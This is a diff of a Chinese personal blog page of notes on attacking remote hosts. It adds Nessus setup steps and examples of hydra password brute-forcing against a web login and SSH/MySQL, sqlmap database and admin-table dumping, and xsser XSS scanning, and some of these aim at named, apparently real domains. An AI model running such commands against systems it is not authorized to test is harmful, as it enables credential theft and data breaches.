@@ -98,7 +98,7 @@
 <meta property="og:url" content="http://yoursite.com/2017/07/14/攻击远程主机的步骤/index.html">
 <meta property="og:site_name" content="zgjx的博客">
 <meta property="og:description" content="尝试攻击远程主机的一些笔记">
-<meta property="og:updated_time" content="2017-07-27T02:50:47.191Z">
+<meta property="og:updated_time" content="2018-03-09T03:19:45.032Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="攻击远程主机的步骤">
 <meta name="twitter:description" content="尝试攻击远程主机的一些笔记">
@@ -385,7 +385,8 @@
 <li>暴力破解win密码hash。</li>
 </ol>
 <p>端口<br>ping扫描<code>nmap -sP 192.168.***.***</code><br>端口及服务扫描<code>nmap -O -Pn -sS -sV 192.168.***.***</code></p>
-<p>漏洞<br>Nessus<br>NetXpose<br>Owasp</p>
+<p>漏洞<br>Nessus<br>    linux:service nessusd start/win:启动服务Tenable nessus<br>    打开本机HTTPS://IP:8834<br>    升级：nessuscli update –all<br>NetXpose<br>Owasp</p>
+<p>工具示例<br>hydra<br>暴力破解http登录密码：<code>hydra www.idanbai.com -l admin -P /root/1800pass.txt -f -V http-post-form &quot;/web/index.php?r=admin/public/login-exec:username=^USER^&amp;password=^PASS^:errcode&quot; -t 4 -vV -e ns</code><br>ssh,mysql:<code>hydra -l root -P /root/1800pass.txt -t 8 -e ns 172.26.1.7 ssh -vV</code><br>sqlmap<br>是否存在sql注入漏洞并扫描出所有数据库：<code>sqlmap -r t.txt --dbs --proxy http://172.17.18.80:8080</code><br>导出数据库表：<code>sqlmap -r t.txt --proxy http://172.17.18.80:8080 --threads 8 --dbms mysql -D stu_ea_sx -T stu_admin_info --dumps</code><br>xsser<br>自动检测反射性xss:<code>xsser -u http://www.jiangkuang.com/product.asp -g ?BigClassName= -s -v --proxy=http://172.17.18.80:8080 --auto</code></p>
 
       
     </div>
@@ -512,7 +513,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">23</span>
+                <span class="site-state-item-count">25</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -619,7 +620,7 @@
         <div class="copyright" >
   
   &copy; 
-  <span itemprop="copyrightYear">2017</span>
+  <span itemprop="copyrightYear">2018</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
